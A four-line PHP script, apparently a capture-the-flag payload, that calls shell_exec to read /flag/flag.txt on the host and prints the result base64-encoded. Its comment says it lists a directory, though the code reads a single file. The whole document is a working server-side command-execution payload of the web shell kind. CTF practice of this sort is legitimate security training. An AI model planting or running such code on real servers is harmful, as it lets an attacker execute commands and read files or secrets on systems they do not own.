<?php
// list /flag directory and return base64 to avoid content-type issues
$out = shell_exec('cat /flag/flag.txt 2>&1');
echo base64_encode($out);
